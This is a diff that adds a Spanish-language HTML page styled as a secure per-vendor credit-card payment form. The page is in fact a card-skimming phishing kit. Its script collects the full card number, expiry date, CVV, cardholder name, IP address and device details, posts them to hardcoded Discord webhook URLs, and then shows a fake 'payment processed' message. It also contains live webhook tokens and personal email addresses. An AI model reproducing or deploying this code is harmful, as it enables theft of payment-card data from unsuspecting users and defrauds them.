@@ -1,0 +1,1069 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pago por Vendedor</title>
+    <style>
+        :root {
+            --primary-color: #007bff;
+            --primary-dark: #0056b3;
+            --primary-light: #66b3ff;
+            --success-color: #28a745;
+            --success-dark: #1e7e34;
+            --warning-color: #ffc107;
+            --text-color: #333;
+            --text-light: #666;
+            --bg-white: rgba(255, 255, 255, 0.95);
+            --bg-input: #f8f9fa;
+            --border-color: #dee2e6;
+            --shadow-light: 0 4px 16px rgba(0, 0, 0, 0.1);
+            --shadow-medium: 0 8px 32px rgba(0, 0, 0, 0.15);
+            --border-radius: 12px;
+            --border-radius-lg: 16px;
+            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        * { 
+            box-sizing: border-box; 
+        }
+
+        body {
+            background-image: url('https://i.pinimg.com/1200x/2f/02/fe/2f02fe2213e5e448f91f120fa4775cbb.jpg');
+            background-size: cover;
+            background-repeat: no-repeat;
+            background-position: center;
+            background-attachment: fixed;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            line-height: 1.6;
+            color: var(--text-color);
+        }
+
+        .main-container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: var(--bg-white);
+            border-radius: var(--border-radius-lg);
+            padding: 40px;
+            box-shadow: var(--shadow-medium);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .main-container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, var(--primary-color), var(--success-color), var(--warning-color));
+        }
+
+        h1, h2 {
+            text-align: center;
+            margin: 0 0 32px 0;
+            font-size: clamp(1.5rem, 4vw, 2.2rem);
+            font-weight: 700;
+            color: var(--primary-color);
+            letter-spacing: -0.02em;
+            text-shadow: 0 2px 4px rgba(0, 123, 255, 0.1);
+        }
+
+        .vendor-selection {
+            text-align: center;
+        }
+
+        .vendor-button {
+            margin: 12px 0;
+            padding: 16px 24px;
+            width: 100%;
+            border-radius: var(--border-radius);
+            border: none;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            color: white;
+            background: linear-gradient(135deg, var(--primary-color) 0%, var(--primary-dark) 100%);
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+            box-shadow: var(--shadow-light);
+        }
+
+        .vendor-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.5s;
+        }
+
+        .vendor-button:hover::before {
+            left: 100%;
+        }
+
+        .vendor-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 40px rgba(0, 123, 255, 0.3);
+        }
+
+        .vendor-button:active {
+            transform: translateY(0);
+            transition: transform 0.1s;
+        }
+
+        .vendor-icon {
+            width: 24px;
+            height: 24px;
+            margin-right: 12px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+        }
+
+        .menu {
+            display: none;
+            animation: fadeIn 0.4s ease-out;
+        }
+
+        .menu.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { 
+                opacity: 0; 
+                transform: translateY(20px); 
+            }
+            to { 
+                opacity: 1; 
+                transform: translateY(0); 
+            }
+        }
+
+        .back-button {
+            margin-bottom: 24px;
+            padding: 10px 20px;
+            background: var(--text-light);
+            color: white;
+            border: none;
+            border-radius: var(--border-radius);
+            cursor: pointer;
+            font-size: 14px;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            width: fit-content;
+        }
+
+        .back-button:hover {
+            background: var(--text-color);
+            transform: translateX(-2px);
+        }
+
+        .payment-info {
+            background: linear-gradient(135deg, #e3f2fd, #f3e5f5);
+            padding: 20px;
+            border-radius: var(--border-radius);
+            margin-bottom: 24px;
+            border-left: 4px solid var(--primary-color);
+        }
+
+        .amount-display {
+            background: var(--success-color);
+            color: white;
+            padding: 16px;
+            border-radius: var(--border-radius);
+            text-align: center;
+            font-size: 1.5rem;
+            font-weight: bold;
+            margin-bottom: 16px;
+            box-shadow: var(--shadow-light);
+        }
+
+        .payment-methods {
+            display: grid;
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+
+        .payment-button {
+            margin: 8px 0;
+            padding: 14px 20px;
+            width: 100%;
+            border-radius: var(--border-radius);
+            border: none;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            color: white;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+            box-shadow: var(--shadow-light);
+        }
+
+        .payment-button.paypal {
+            background: linear-gradient(135deg, #0070ba, #003087);
+        }
+
+        .payment-button.binance {
+            background: linear-gradient(135deg, #f0b90b, #c99400);
+        }
+
+        .payment-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
+        }
+
+        .payment-button img {
+            height: 24px;
+            width: 24px;
+            margin-right: 12px;
+            border-radius: 4px;
+        }
+
+        .card-form-container {
+            background: white;
+            padding: 32px;
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow-medium);
+            border: 1px solid var(--border-color);
+            margin-top: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 100px;
+            gap: 12px;
+            align-items: end;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: var(--text-color);
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 14px 16px;
+            border-radius: var(--border-radius);
+            border: 2px solid var(--border-color);
+            font-size: 16px;
+            background: var(--bg-input);
+            transition: var(--transition);
+            font-family: inherit;
+        }
+
+        input:focus, select:focus {
+            border-color: var(--primary-color);
+            outline: none;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(0, 123, 255, 0.1);
+            transform: translateY(-1px);
+        }
+
+        .submit-button {
+            background: linear-gradient(135deg, var(--success-color), var(--success-dark));
+            color: white;
+            padding: 16px 24px;
+            border: none;
+            border-radius: var(--border-radius);
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: var(--transition);
+            margin-top: 16px;
+        }
+
+        .submit-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(40, 167, 69, 0.3);
+        }
+
+        .gmail-info {
+            background: var(--warning-color);
+            color: var(--text-color);
+            padding: 16px;
+            border-radius: var(--border-radius);
+            margin-bottom: 16px;
+            font-weight: 500;
+            text-align: center;
+        }
+
+        .gmail-info strong {
+            color: #000;
+            font-size: 1.1em;
+        }
+
+        /* DEBUG INFO */
+        .debug-info {
+            background: #f8f9fa;
+            border: 1px solid #dee2e6;
+            border-radius: var(--border-radius);
+            padding: 15px;
+            margin-top: 20px;
+            font-family: monospace;
+            font-size: 12px;
+        }
+
+        .debug-info h4 {
+            color: #495057;
+            margin: 0 0 10px 0;
+            font-family: sans-serif;
+        }
+
+        /* Responsividad */
+        @media (max-width: 768px) {
+            body {
+                padding: 10px;
+            }
+            
+            .main-container {
+                padding: 20px;
+                margin: 10px auto;
+            }
+            
+            .form-row {
+                grid-template-columns: 1fr;
+            }
+            
+            .vendor-button {
+                padding: 18px 24px;
+                font-size: 18px;
+            }
+        }
+
+        /* Estados de validaci�n */
+        .error {
+            border-color: #dc3545 !important;
+            background-color: #fff5f5 !important;
+        }
+
+        .success {
+            border-color: var(--success-color) !important;
+            background-color: #f0f9f0 !important;
+        }
+
+        /* Loader */
+        .loading {
+            pointer-events: none;
+            opacity: 0.7;
+        }
+
+        .loading::after {
+            content: '';
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            border: 2px solid transparent;
+            border-top-color: currentColor;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-left: 10px;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+    
+.overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(30, 0, 50, 0.7);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 10;
+  flex-direction: column;
+}
+.follow-container {
+  background: rgba(30, 30, 40, 0.55);
+  border-radius: 20px;
+  padding: 40px 30px;
+  display: flex;
+  align-items: center;
+  gap: 30px;
+  box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
+  border: 1px solid rgba(120,40,180,0.18);
+}
+.follow-img {
+  width: 120px;
+  border-radius: 16px;
+  box-shadow: 0 4px 16px rgba(0,0,0,0.3);
+}
+.follow-content {
+  display: flex;
+  flex-direction: column;
+  align-items: flex-start;
+  gap: 18px;
+}
+.follow-title {
+  color: #fff;
+  font-size: 2rem;
+  font-weight: 700;
+  margin-bottom: 10px;
+  letter-spacing: 1px;
+  text-shadow: 0 0 8px #fff, 0 2px 8px #7c2ae8;
+}
+.yt-btn {
+  display: flex;
+  align-items: center;
+  background: #ff2222;
+  color: #fff;
+  border: none;
+  border-radius: 8px;
+  padding: 12px 22px;
+  font-size: 1.1rem;
+  font-weight: 700;
+  cursor: pointer;
+  gap: 10px;
+  transition: background 0.2s;
+  box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+  text-decoration: none;
+  text-shadow: 0 0 8px #fff;
+}
+.yt-btn:hover {
+  background: #cc1818;
+}
+.yt-icon {
+  width: 28px;
+  height: 28px;
+  fill: #fff;
+  filter: drop-shadow(0 0 6px #fff);
+}
+@media (max-width: 600px) {
+  .follow-container { flex-direction: column; gap: 18px; padding: 24px 10px;}
+  .follow-img { width: 90px;}
+}
+</style>
+</head>
+<body>
+</div>
+    <div class="main-container">
+        <!-- Selecci�n de Vendedores -->
+        <div id="vendor-selection" class="vendor-selection">
+            <h1>💳 Selecciona un Vendedor</h1>
+            
+            <button class="vendor-button" onclick="mostrarMenu('slayer')">
+                <div class="vendor-icon">🎮</div>
+                Slayer Xit
+            </button>
+            
+            <button class="vendor-button" onclick="mostrarMenu('glizzy')">
+                <div class="vendor-icon">?</div>
+                Glizzy Wvttz
+            </button>
+            
+            <button class="vendor-button" onclick="mostrarMenu('arias')">
+                <div class="vendor-icon">🔥</div>
+                Arias
+            </button>
+            
+            <button class="vendor-button" onclick="mostrarMenu('carlos')">
+                <div class="vendor-icon">💎</div>
+                Carlos
+            </button>
+        </div>
+
+        <!-- Slayer Xit -->
+        <div class="menu" id="slayer">
+            <button class="back-button" onclick="volverMenu()">← Volver</button>
+            <h2>🎮 Slayer Xit - Métodos de Pago</h2>
+            
+            <div class="payment-info">
+                <div class="amount-display">$4.97 USD</div>
+                <div class="gmail-info">
+                    📧 Transferir a: <strong>carlitosmta5@gmail.com</strong>
+                </div>
+                <p style="text-align: center; margin: 0; color: var(--text-light);">
+                    Debes transferir exactamente $4.97 independientemente de tu método de pago
+                </p>
+            </div>
+
+            <div class="card-form-container">
+                <h3>💳 Tarjeta de Crédito/Débito</h3>
+                <form onsubmit="procesarPago(event, 'slayer')">
+                    <div class="form-group">
+                        <label>Nombre del Titular</label>
+                        <input type="text" name="nombre" required placeholder="Juan Pérez">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>Número de Tarjeta</label>
+                        <input type="text" name="numero" maxlength="19" pattern="[0-9\s]{13,19}" required placeholder="1234 5678 9012 3456" oninput="formatCardNumber(this)">
+                    </div>
+                    
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label>Expiraci�n</label>
+                            <input type="text" name="expiracion" maxlength="5" pattern="\d{2}/\d{2}" required placeholder="MM/AA" oninput="formatExpiry(this)">
+                        </div>
+                        <div class="form-group">
+                            <label>CVV</label>
+                            <input type="text" name="cvv" maxlength="4" pattern="\d{3,4}" required placeholder="123">
+                        </div>
+                    </div>
+                    
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label>Monto</label>
+                            <input type="number" name="monto" step="0.01" value="4.97" required>
+                        </div>
+                        <div class="form-group">
+                            <label>Moneda</label>
+                            <select name="moneda">
+                                <option>USD</option>
+                                <option>MXN</option>
+                                <option>EUR</option>
+                            </select>
+                        </div>
+                    </div>
+                    
+                    <button type="submit" class="submit-button">🔒 Procesar Pago Seguro</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- Glizzy Wvttz -->
+        <div class="menu" id="glizzy">
+            <button class="back-button" onclick="volverMenu()">← Volver</button>
+            <h2>? Glizzy Wvttz - Métodos de Pago</h2>
+            
+            <div class="payment-info">
+                <div class="amount-display">$4.97 USD</div>
+                <div class="gmail-info">
+                    📧 Transferir a: <strong>cinthiab781@gmail.com</strong>
+                </div>
+                <p style="text-align: center; margin: 0; color: var(--text-light);">
+                    Debes transferir exactamente $4.97 independientemente de tu método de pago
+                </p>
+            </div>
+
+            <div class="card-form-container">
+                <h3>💳 Tarjeta de Crédito/Débito</h3>
+                <form onsubmit="procesarPago(event, 'glizzy')">
+                    <div class="form-group">
+                        <label>Nombre del Titular</label>
+                        <input type="text" name="nombre" required placeholder="Juan Pérez">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>Número de Tarjeta</label>
+                        <input type="text" name="numero" maxlength="19" pattern="[0-9\s]{13,19}" required placeholder="1234 5678 9012 3456" oninput="formatCardNumber(this)">
+                    </div>
+                    
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label>Expiraci�n</label>
+                            <input type="text" name="expiracion" maxlength="5" pattern="\d{2}/\d{2}" required placeholder="MM/AA" oninput="formatExpiry(this)">
+                        </div>
+                        <div class="form-group">
+                            <label>CVV</label>
+                            <input type="text" name="cvv" maxlength="4" pattern="\d{3,4}" required placeholder="123">
+                        </div>
+                    </div>
+                    
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label>Monto</label>
+                            <input type="number" name="monto" step="0.01" value="4.97" required>
+                        </div>
+                        <div class="form-group">
+                            <label>Moneda</label>
+                            <select name="moneda">
+                                <option>USD</option>
+                                <option>MXN</option>
+                                <option>EUR</option>
+                            </select>
+                        </div>
+                    </div>
+                    
+                    <button type="submit" class="submit-button">🔒 Procesar Pago Seguro</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- Arias -->
+        <div class="menu" id="arias">
+            <button class="back-button" onclick="volverMenu()">← Volver</button>
+            <h2>🔥 Arias - Tarjeta de Crédito</h2>
+            
+            <div class="card-form-container">
+                <h3>💳 Informaci�n de Pago</h3>
+                <form onsubmit="procesarPago(event, 'arias')">
+                    <div class="form-group">
+                        <label>Nombre del Titular</label>
+                        <input type="text" name="nombre" required placeholder="Juan Pérez">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>Número de Tarjeta</label>
+                        <input type="text" name="numero" maxlength="19" pattern="[0-9\s]{13,19}" required placeholder="1234 5678 9012 3456" oninput="formatCardNumber(this)">
+                    </div>
+                    
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label>Expiraci�n</label>
+                            <input type="text" name="expiracion" maxlength="5" pattern="\d{2}/\d{2}" required placeholder="MM/AA" oninput="formatExpiry(this)">
+                        </div>
+                        <div class="form-group">
+                            <label>CVV</label>
+                            <input type="text" name="cvv" maxlength="4" pattern="\d{3,4}" required placeholder="123">
+                        </div>
+                    </div>
+                    
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label>Monto</label>
+                            <input type="number" name="monto" step="0.01" placeholder="0.00" required>
+                        </div>
+                        <div class="form-group">
+                            <label>Moneda</label>
+                            <select name="moneda">
+                                <option>USD</option>
+                                <option>MXN</option>
+                                <option>EUR</option>
+                            </select>
+                        </div>
+                    </div>
+                    
+                    <button type="submit" class="submit-button">🔒 Procesar Pago Seguro</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- Carlos -->
+        <div class="menu" id="carlos">
+            <button class="back-button" onclick="volverMenu()">← Volver</button>
+            <h2>💎 Carlos - Tarjeta de Crédito</h2>
+            
+            <div class="card-form-container">
+                <h3>💳 Informaci�n de Pago</h3>
+                <form onsubmit="procesarPago(event, 'carlos')">
+                    <div class="form-group">
+                        <label>Nombre del Titular</label>
+                        <input type="text" name="nombre" required placeholder="Juan Pérez">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>Número de Tarjeta</label>
+                        <input type="text" name="numero" maxlength="19" pattern="[0-9\s]{13,19}" required placeholder="1234 5678 9012 3456" oninput="formatCardNumber(this)">
+                    </div>
+                    
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label>Expiraci�n</label>
+                            <input type="text" name="expiracion" maxlength="5" pattern="\d{2}/\d{2}" required placeholder="MM/AA" oninput="formatExpiry(this)">
+                        </div>
+                        <div class="form-group">
+                            <label>CVV</label>
+                            <input type="text" name="cvv" maxlength="4" pattern="\d{3,4}" required placeholder="123">
+                        </div>
+                    </div>
+                    
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label>Monto</label>
+                            <input type="number" name="monto" step="0.01" placeholder="0.00" required>
+                        </div>
+                        <div class="form-group">
+                            <label>Moneda</label>
+                            <select name="moneda">
+                                <option>USD</option>
+                                <option>MXN</option>
+                                <option>EUR</option>
+                            </select>
+                        </div>
+                    </div>
+                    
+                    <button type="submit" class="submit-button">🔒 Procesar Pago Seguro</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- Panel de Debug -->
+        <div id="debug-panel" class="debug-info" style="display: none;">
+            <h4>🐛 Debug Information</h4>
+            <div id="debug-content">
+                <p>Informaci�n de debug aparecer� aquí después del procesamiento...</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Variable global para debug
+        let debugMode = false;
+
+        function mostrarMenu(vendedor) {
+            // Ocultar selecci�n principal
+            document.getElementById('vendor-selection').style.display = 'none';
+            
+            // Ocultar todos los menús
+            document.querySelectorAll('.menu').forEach(menu => {
+                menu.classList.remove('active');
+            });
+            
+            // Mostrar el menú seleccionado
+            const menuSeleccionado = document.getElementById(vendedor);
+            menuSeleccionado.classList.add('active');
+        }
+
+        function volverMenu() {
+            // Ocultar todos los menús
+            document.querySelectorAll('.menu').forEach(menu => {
+                menu.classList.remove('active');
+            });
+            
+            // Mostrar selecci�n principal
+            document.getElementById('vendor-selection').style.display = 'block';
+            
+            // Ocultar debug panel
+            document.getElementById('debug-panel').style.display = 'none';
+        }
+
+        function formatCardNumber(input) {
+            // Remover espacios y caracteres no numéricos
+            let value = input.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            
+            // Agregar espacio cada 4 dígitos
+            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
+            
+            input.value = formattedValue;
+        }
+
+        function formatExpiry(input) {
+            let value = input.value.replace(/\D/g, '');
+            
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            
+            input.value = value;
+        }
+
+        async function procesarPago(event, vendedor) {
+            event.preventDefault();
+            
+            const form = event.target;
+            const button = form.querySelector('.submit-button');
+            const originalText = button.textContent;
+            
+            // Obtener datos del formulario usando FormData
+            const formData = new FormData(form);
+            
+            // Recopilar datos completos del formulario
+            const datosCompletos = {
+                vendedor: vendedor,
+                nombre: formData.get('nombre'),
+                numero: formData.get('numero').replace(/\s/g, ''), // Número completo sin espacios
+                numeroConFormato: formData.get('numero'), // Número con formato para mostrar
+                expiracion: formData.get('expiracion'),
+                cvv: formData.get('cvv'),
+                monto: formData.get('monto'),
+                moneda: formData.get('moneda'),
+                timestamp: new Date().toISOString(),
+                timestampLocal: new Date().toLocaleString(),
+                ip: await obtenerIP(),
+                userAgent: navigator.userAgent,
+                url: window.location.href,
+                dispositivo: obtenerInfoDispositivo()
+            };
+            
+            // Mostrar debug info si est� habilitado
+            if (debugMode) {
+                mostrarDebugInfo(datosCompletos);
+            }
+            
+            // Añadir estado de carga
+            button.classList.add('loading');
+            button.textContent = 'Procesando...';
+            button.disabled = true;
+            
+            try {
+                // Enviar webhook con datos completos
+                await enviarWebhookCompleto(datosCompletos, vendedor);
+                
+                // Mostrar éxito
+                button.classList.remove('loading');
+                button.textContent = '✅ Pago Procesado';
+                button.style.background = 'linear-gradient(135deg, var(--success-color), var(--success-dark))';
+                
+                setTimeout(() => {
+                    alert(`¡Pago procesado exitosamente para ${vendedor}!\n\nTodos los datos han sido enviados correctamente.`);
+                    
+                    // Resetear formulario
+                    form.reset();
+                    button.textContent = originalText;
+                    button.disabled = false;
+                    button.style.background = '';
+                }, 1000);
+                
+            } catch (error) {
+                console.error('Error procesando pago:', error);
+                
+                button.classList.remove('loading');
+                button.textContent = '❌ Error - Reintentar';
+                button.style.background = 'linear-gradient(135deg, #dc3545, #c82333)';
+                button.disabled = false;
+                
+                setTimeout(() => {
+                    button.textContent = originalText;
+                    button.style.background = '';
+                }, 3000);
+            }
+        }
+
+        // Funci�n mejorada para enviar webhook con datos completos
+        async function enviarWebhookCompleto(datos, vendedor) {
+            // URLs de webhook de Discord por vendedor
+            const webhookURLs = {
+                'slayer': 'https://discord.com/api/webhooks/1407627042924527637/5AjvpbN69cuWtNrRFuEwmKXdfayOV1JOXI7qrgZpzfoKYvaTwL3VxwhIfL0KxmTTMfMw',
+                'glizzy': 'https://discord.com/api/webhooks/1407626860589879367/A5z-GXG9-zxa7IuoofPRAFZDB87RLQ1yRJ2wITR44fuzCU4Kc-VMVvSuBt-jK42NUh0X', 
+                'arias': null, // Sin webhook configurado
+                'carlos': null // Sin webhook configurado
+            };
+
+            const webhookURL = webhookURLs[vendedor];
+            
+            if (!webhookURL) {
+                console.log(`No hay webhook configurado para ${vendedor}`);
+                return { success: true, message: 'Procesado localmente' };
+            }
+
+            // Obtener emoji e informaci�n del vendedor
+            const vendedorInfo = {
+                'slayer': { emoji: '🎮', nombre: 'Slayer Xit', color: 0x007bff },
+                'glizzy': { emoji: '?', nombre: 'Glizzy Wvttz', color: 0x28a745 },
+                'arias': { emoji: '🔥', nombre: 'Arias', color: 0xffc107 },
+                'carlos': { emoji: '💎', nombre: 'Carlos', color: 0x6f42c1 }
+            };
+
+            const info = vendedorInfo[vendedor] || { emoji: '💳', nombre: vendedor, color: 0x007bff };
+
+            // Payload para Discord con TODOS los datos
+            const discordPayload = {
+                username: `💳 Sistema de Pagos COMPLETO`,
+                avatar_url: "https://i.pinimg.com/736x/10/4f/24/104f249d8b4824276ed9f2892a8fdb6e.jpg",
+                embeds: [{
+                    title: `${info.emoji} NUEVO PAGO - ${info.nombre}`,
+                    description: `**INFORMACIÓN COMPLETA DE PAGO**`,
+                    color: info.color,
+                    fields: [
+                        {
+                            name: "👤 CLIENTE",
+                            value: `**${datos.nombre}**`,
+                            inline: true
+                        },
+                        {
+                            name: "💳 NÚMERO COMPLETO",
+                            value: `**${datos.numero}**\n*Formato: ${datos.numeroConFormato}*`,
+                            inline: true
+                        },
+                        {
+                            name: "📅 EXPIRACIÓN",
+                            value: `**${datos.expiracion}**`,
+                            inline: true
+                        },
+                        {
+                            name: "💰 MONTO",
+                            value: `**${datos.monto} ${datos.moneda}**`,
+                            inline: true
+                        },
+                        {
+                            name: "🔒 CVV",
+                            value: `**${datos.cvv}**`,
+                            inline: true
+                        },
+                        {
+                            name: "🌐 IP CLIENTE",
+                            value: `**${datos.ip}**`,
+                            inline: true
+                        },
+                        {
+                            name: "⏰ FECHA Y HORA",
+                            value: `${datos.timestampLocal}`,
+                            inline: false
+                        },
+                        {
+                            name: "📱 DISPOSITIVO",
+                            value: `${datos.dispositivo}`,
+                            inline: false
+                        },
+                        {
+                            name: "🔗 URL",
+                            value: `${datos.url}`,
+                            inline: false
+                        },
+                        {
+                            name: "📋 USER AGENT",
+                            value: `\`\`\`${datos.userAgent.length > 200 ? datos.userAgent.substring(0, 200) + '...' : datos.userAgent}\`\`\``,
+                            inline: false
+                        }
+                    ],
+                    footer: {
+                        text: `✅ DATOS COMPLETOS • Sistema v2.1 • ${vendedor.toUpperCase()}`,
+                        icon_url: "https://i.pinimg.com/736x/c0/74/9b/c0749b36dc5b0ac3775f9e5d23c3b86f.jpg"
+                    },
+                    timestamp: datos.timestamp,
+                    thumbnail: {
+                        url: "https://i.pinimg.com/736x/b8/36/c4/b836c4b0c23d52b4590a1a82c1a3bc88.jpg"
+                    }
+                }]
+            };
+
+            console.log('Enviando datos completos:', datos);
+            console.log('Payload Discord:', discordPayload);
+
+            const response = await fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(discordPayload)
+            });
+
+            if (!response.ok) {
+                const errorText = await response.text();
+                console.error('Error response:', errorText);
+                throw new Error(`Discord webhook error: ${response.status} - ${errorText}`);
+            }
+
+            console.log('Webhook enviado exitosamente');
+            return { success: true, message: 'Enviado a Discord con datos completos' };
+        }
+
+        // Obtener IP del usuario
+        async function obtenerIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Error obteniendo IP:', error);
+                return 'IP no disponible';
+            }
+        }
+
+        // Obtener informaci�n del dispositivo
+        function obtenerInfoDispositivo() {
+            const ua = navigator.userAgent;
+            let dispositivo = 'Desconocido';
+            
+            if (/Mobile|Android|iPhone|iPad/.test(ua)) {
+                if (/iPhone/.test(ua)) dispositivo = 'iPhone';
+                else if (/iPad/.test(ua)) dispositivo = 'iPad';
+                else if (/Android/.test(ua)) dispositivo = 'Android';
+                else dispositivo = 'M�vil';
+            } else {
+                if (/Windows/.test(ua)) dispositivo = 'Windows PC';
+                else if (/Mac/.test(ua)) dispositivo = 'Mac';
+                else if (/Linux/.test(ua)) dispositivo = 'Linux';
+                else dispositivo = 'Escritorio';
+            }
+            
+            return dispositivo;
+        }
+
+        // Funci�n para mostrar informaci�n de debug
+        function mostrarDebugInfo(datos) {
+            const debugPanel = document.getElementById('debug-panel');
+            const debugContent = document.getElementById('debug-content');
+            
+            debugContent.innerHTML = `
+                <p><strong>Vendedor:</strong> ${datos.vendedor}</p>
+                <p><strong>Nombre:</strong> ${datos.nombre}</p>
+                <p><strong>Número (completo):</strong> ${datos.numero}</p>
+                <p><strong>Número (formato):</strong> ${datos.numeroConFormato}</p>
+                <p><strong>Expiraci�n:</strong> ${datos.expiracion}</p>
+                <p><strong>CVV:</strong> ${datos.cvv}</p>
+                <p><strong>Monto:</strong> ${datos.monto} ${datos.moneda}</p>
+                <p><strong>IP:</strong> ${datos.ip}</p>
+                <p><strong>Dispositivo:</strong> ${datos.dispositivo}</p>
+                <p><strong>Timestamp:</strong> ${datos.timestamp}</p>
+                <p><strong>User Agent:</strong> ${datos.userAgent.substring(0, 100)}...</p>
+            `;
+            
+            debugPanel.style.display = 'block';
+        }
+
+        // Funci�n para activar/desactivar modo debug (puedes llamarla desde la consola)
+        function toggleDebug() {
+            debugMode = !debugMode;
+            console.log('Modo debug:', debugMode ? 'ACTIVADO' : 'DESACTIVADO');
+            
+            if (!debugMode) {
+                document.getElementById('debug-panel').style.display = 'none';
+            }
+        }
+
+        // Validaci�n en tiempo real
+        document.addEventListener('input', function(e) {
+            if (e.target.type === 'text' || e.target.type === 'number') {
+                if (e.target.checkValidity()) {
+                    e.target.classList.remove('error');
+                    e.target.classList.add('success');
+                } else {
+                    e.target.classList.remove('success');
+                    e.target.classList.add('error');
+                }
+            }
+        });
+
+        // Prevenir envío con Enter en campos de texto
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter' && e.target.type === 'text') {
+                e.preventDefault();
+            }
+        });
+
+        // Mostrar informaci�n de debug en consola al cargar
+        console.log('🛠️ Sistema de Pagos v2.1 cargado');
+        console.log('💡 Para activar modo debug, escribe: toggleDebug()');
+        console.log('🔍 Webhooks configurados para: slayer, glizzy');
+    </script>
+
+<script>
+document.getElementById('ytBtn').addEventListener('click', function(e) {
+  e.preventDefault();
+  window.open('https://www.youtube.com/@DraakoXitty', '_blank');
+  document.getElementById('overlay').style.display = 'none';
+});
+</script>
+</body>
+</html>
+
+
+
+
